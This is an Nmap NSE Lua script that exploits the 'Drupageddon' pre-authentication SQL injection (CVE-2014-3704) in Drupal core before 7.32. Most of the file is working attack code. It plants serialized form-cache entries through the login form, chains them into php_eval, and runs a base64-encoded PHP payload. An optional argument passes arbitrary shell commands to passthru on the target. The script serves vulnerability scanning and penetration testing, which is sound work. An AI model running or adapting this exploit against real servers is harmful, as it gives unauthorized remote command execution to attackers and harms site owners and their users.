local base64 = require "base64"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local url = require "url"
local vulns = require "vulns"

description = [[
Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
of Drupal core are known to be affected.

Vulnerability allows remote attackers to conduct SQL injection attacks via an
array containing crafted keys.

Vulnerability originally discovered by Stefan Horst from SektionEins.
]]

-- For technical details on the exploit implemented here, see:
-- https://www.whitewinterwolf.com/posts/2017/11/16/drupageddon-revisited-a-new-path-from-sql-injection-to-remote-command-execution-cve-2014-3704/

---
-- @usage
-- nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2014-3704:
-- |   VULNERABLE:
-- |   Drupal - pre Auth SQL Injection Vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-3704
-- |       The expandArguments function in the database abstraction API in
-- |       Drupal core 7.x before 7.32 does not properly construct prepared
-- |       statements, which allows remote attackers to conduct SQL injection
-- |       attacks via an array containing crafted keys.
-- |
-- |     Disclosure date: 2014-10-15
-- |     Exploit results:
-- |       Linux debian 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
-- |     References:
-- |       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
-- |       https://www.drupal.org/SA-CORE-2014-005
-- |       http://www.securityfocus.com/bid/70595
-- |_      https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3704
--
-- @args http-vuln-cve2014-3704.uri Drupal root directory on the website. Default: /
-- @args http-vuln-cve2014-3704.cmd Shell command to execute. Default: nil
---

author = "WhiteWinterWolf <contact()whitewinterwolf.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

portrule = shortport.http

local function sql_insert(id, value)
  local curlyopen = stdnse.generate_random_string(8)
  local curlyclose = stdnse.generate_random_string(8)
  value = value:gsub('{', curlyopen)
  value = value:gsub('}', curlyclose)

  local sql = "INSERT INTO {cache_form} "
    .. "(cid, data, expire, created, serialized)"
    .. "VALUES ('" .. id .. "', REPLACE(REPLACE('" .. value .. "', '"
    .. curlyopen .. "', CHAR(" .. string.byte('{') .. ")), '"
    .. curlyclose .. "', CHAR(" .. string.byte('}') .. ")), -1, 0, 1);"

  return sql
end

action = function(host, port)

  local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln = {
    title = 'Drupal - pre Auth SQL Injection Vulnerability',
    state = vulns.STATE.NOT_VULN,
    description = [[
  The expandArguments function in the database abstraction API in
  Drupal core 7.x before 7.32 does not properly construct prepared
  statements, which allows remote attackers to conduct SQL injection
  attacks via an array containing crafted keys.
    ]],
    IDS = {CVE = 'CVE-2014-3704'},
    references = {
      'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
      'https://www.drupal.org/SA-CORE-2014-005',
      'http://www.securityfocus.com/bid/70595',
    },
    dates = {
      disclosure = {year = '2014', month = '10', day = '15'},
    },
  }

  local alphanum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

  local uri = stdnse.get_script_args(SCRIPT_NAME .. ".uri") or '/'
  uri = uri .. "?q=user/login"
  local cmd = stdnse.get_script_args(SCRIPT_NAME .. ".cmd") or nil

  local token = stdnse.generate_random_string(16, alphanum)
  local form_build_id = 'form-' .. stdnse.generate_random_string(43, alphanum)

  -- Build the payload
  local payload = ""
    -- Drop and close the PHP output buffer.
    .. "while (@ ob_end_clean()); "
    -- Cleanly remove the malicious cache entry.
    .. "cache_clear_all(array('form_" .. form_build_id .. "', 'form_state_"
    .. form_build_id .. "'), 'cache_form'); "
    -- Output the token to detect successful compromize.
    .. "echo('" .. token .. "'); "
  -- Execute a command if the user asked.
  if cmd ~= nil then
    payload = payload .. "passthru('" .. cmd .. "'); "
      .. "echo('" .. token .. "'); "
  end
  payload = payload .. "exit(0);"
  payload = base64.enc(payload)
  -- '<?php' tag required by php_eval().
  payload = "<?php eval(base64_decode(\\'" .. payload .. "\\'));"
  -- Don't count the backslashes
  local payload_len = payload:len() - 2

  -- Serialized malicious form state.
  -- The PHP module may be disabled (and should be).
  -- Load its definition manually to get access to php_eval().
  local state = 'a:1:{s:10:"build_info";a:1:{s:5:"files";a:1:{'
    .. 'i:0;s:22:"modules/php/php.module";'
  .. '}}}'
  -- Initiates a POP chain in includes/form.inc:1850, form_builder()
  local form = 'a:6:{'
    .. 's:5:"#type";s:4:"form";'
    .. 's:8:"#parents";a:1:{i:0;s:4:"user";}'
    .. 's:8:"#process";a:1:{i:0;s:13:"drupal_render";}'
    .. 's:16:"#defaults_loaded";b:1;'
    .. 's:12:"#post_render";a:1:{i:0;s:8:"php_eval";}'
    .. 's:9:"#children";s:' .. tostring(payload_len) .. ':"' .. payload .. '";'
  .. '}'

  -- SQL injection key lines:
  -- - modules/user/user.module:2149, user_login_authenticate_validate()
  -- - include/database/database.inc:745, expandArguments()
  local sql = sql_insert('form_state_' .. form_build_id, state)
    .. sql_insert('form_' .. form_build_id, form)

  -- Use the login form to inject the malicious cache entry.
  -- Some websites use redirects to enforce clean URLs.
  -- Raw data is required when uploading the payload to enfore the fields
  -- order (Lua doesn't keep tables order).
  stdnse.debug(1, "Uploading the payload")
  local opts = {
    bypass_cache = true,
    header = {
      ["Content-Type"] = "application/x-www-form-urlencoded",
    },
    redirect_ok = true,
  }
  -- The 'name[0]' field must be sent *after* the injection.
  local data = "form_id=user_login&form_build_id="
    .. "&" .. url.escape("name[0;" .. sql .. "#]") .. "="
    .. "&name%5b0%5d=&op=Log%20in"
    .. "&pass=" .. stdnse.generate_random_string(8, alphanum)
  local res = http.post(host, port, uri, opts, nil, data)
  stdnse.debug(1, string.format("Server reply: %s", res["status-line"]))

  if res["status"] == 200 then
    -- Trigger the malicious cache entry using its form ID.
    stdnse.debug(1, "Attempt to trigger the payload")
    data = {
      form_id = "user_login",
      form_build_id = form_build_id,
      name = stdnse.generate_random_string(8, alphanum),
      op = "Log in",
      pass = stdnse.generate_random_string(8, alphanum),
    }
    res = http.post(host, port, uri, opts, nil, data)
    stdnse.debug(1, string.format("Server reply: %s", res["status-line"]))
    -- stdnse.debug(2, string.format("Reply body:\n%s", res["body"]))

    if res["body"]:find(token) ~= nil then
      stdnse.debug(1, "EXPLOITABLE!")
      vuln.state = vulns.STATE.EXPLOIT
      if cmd ~= nil then
        local pattern = ".-" .. token .. "(.*)" .. token .. ".*"
        vuln.exploit_results = res["body"]:gsub(pattern, "%1")
      end
    end
  end

  return vulnReport:make_output(vuln)
end
